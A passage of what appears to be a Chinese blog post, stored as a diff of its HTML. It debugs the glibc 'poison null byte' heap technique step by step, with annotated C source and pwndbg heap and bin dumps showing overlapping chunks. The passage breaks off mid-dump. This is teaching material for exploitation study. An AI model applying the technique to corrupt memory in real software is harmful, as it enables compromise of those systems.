content:<br>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD<br>Thanks <span class="hljs-keyword">to</span> https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation <span class="hljs-keyword">of</span> this technique.<br></code></pre></td></tr></table></figure>
+
+<h2 id="关键代码调试"><a href="#关键代码调试" class="headerlink" title="关键代码调试"></a>关键代码调试</h2><p>本例9个断点分别断在:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">40</span>   barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>► <span class="hljs-number">41</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br>  <span class="hljs-number">42</span>           <span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br>  <span class="hljs-number">56</span>   <span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br>► <span class="hljs-number">57</span>   <span class="hljs-built_in">free</span>(b);<br><br>  <span class="hljs-number">58</span><br>► <span class="hljs-number">59</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>  <span class="hljs-number">62</span>   a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br>► <span class="hljs-number">63</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>  <span class="hljs-number">77</span>   b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-number">78</span><br>► <span class="hljs-number">79</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><br>  <span class="hljs-number">87</span>   b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>► <span class="hljs-number">88</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br>  <span class="hljs-number">95</span>  <span class="hljs-built_in">free</span>(b1);<br>  <span class="hljs-number">96</span>  <span class="hljs-built_in">free</span>(c);<br>  <span class="hljs-number">97</span><br>► <span class="hljs-number">98</span>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br><br>  <span class="hljs-number">99</span>  d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>► <span class="hljs-number">100</span>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br>  <span class="hljs-number">103</span>  <span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br>  <span class="hljs-number">104</span><br>► <span class="hljs-number">105</span>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br></code></pre></td></tr></table></figure>
+
+<p>下面我们开始调试</p>
+<p>首先是分配了chunk a,b,c,barrier</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">529</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603320</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603430</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603540</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133825</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后程序修改了b+0x1f0位为0x200,也就是</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; p/x <span class="hljs-number">0x603120</span>+<span class="hljs-number">0</span>x1f0<br>$<span class="hljs-number">4</span> = <span class="hljs-number">0x603310</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603310</span><br><span class="hljs-number">0x603310</span>:       <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000200</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603320</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000111</span><br><span class="hljs-number">0x603330</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603340</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603350</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>
+
+<p>好了,下面我们继续,此时程序已经释放了b</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603110 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">529</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603320 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">528</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">272</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603430 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603540 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">133825</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x603110 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603110<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+
+<p>之后,程序将a[real_a_size]修改为了0x00,也就是将我们的b的size改为了0x200,(为了通过前文所说的check)此时的堆</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603110 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">512</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603310 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">512</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x210,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x110,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x603110 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603110<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>可以看到,随着b的size被覆盖为了0x200,c的pre_size也变成了0x200</p>
+<p>之后我们再次调用malloc的时候,因为b被视为为free态,此时会调用unlink</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603110 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1d68 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">584</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1d68 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">584</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603220 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">241</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603310 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">240</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x210,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x110,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x603220 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603220 <span class="hljs-comment">/* &#x27; 2`&#x27; */</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>此时我们的b1已经被放到了原本b的位置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p b1-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">15 = (uint8_t *) 0x603110 <span class="hljs-string">&quot;&quot;</span></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p b-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">17 = (uint8_t *) 0x603110 <span class="hljs-string">&quot;&quot;</span></span><br><span class="hljs-meta prompt_">pwndbg&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后系统又malloc了b2</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1d68</span> &lt;main_arena+<span class="hljs-number">584</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1d68</span> &lt;main_arena+<span class="hljs-number">584</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603220</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span 